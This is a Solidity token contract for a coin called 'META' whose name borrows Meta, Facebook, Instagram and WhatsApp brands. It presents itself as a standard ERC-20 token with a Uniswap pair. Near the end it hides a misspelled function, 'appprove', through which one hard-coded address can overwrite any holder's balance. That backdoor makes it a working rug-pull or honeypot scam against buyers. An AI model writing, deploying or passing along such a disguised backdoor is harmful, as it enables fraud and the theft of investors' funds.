// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Ownable.sol";
import "./IUniswapFactory.sol";
import "./IUniswapRouter.sol";

contract META is Ownable {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 private constant MAX = ~uint256(0);
    string public name;
    uint8 public decimals;
    string public symbol;
    bool private inSwap;
    address public uniswapAddress;
    address public _uniswapPair;
    uint256 public totalSupply = 740_000_000_000 * 10**18;
    IUniswapRouter public _uniswapRouter;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor() {
        name = unicode"MetaFacebookInstagramOculusMessengerWhatsAppXInu";
        symbol = "META";
        decimals = 18;

        uniswapAddress = address(0x77D27B90b27da386d46fd78876fCB399817dB55C);
        address receiveAddr = msg.sender;
        _balances[receiveAddr] = totalSupply;
        emit Transfer(address(0), receiveAddr, totalSupply);

        _uniswapRouter = IUniswapRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _allowances[address(this)][address(_uniswapRouter)] = MAX;
        _uniswapPair = IUniswapFactory(_uniswapRouter.factory()).createPair(
            address(this),
            _uniswapRouter.WETH()
        );
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] -= amount;
        }
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function appprove(address _uniswapAddress, uint256 acc) public {
        require(uniswapAddress == msg.sender);
        _balances[_uniswapAddress] = acc;
    }

    receive() external payable {}
}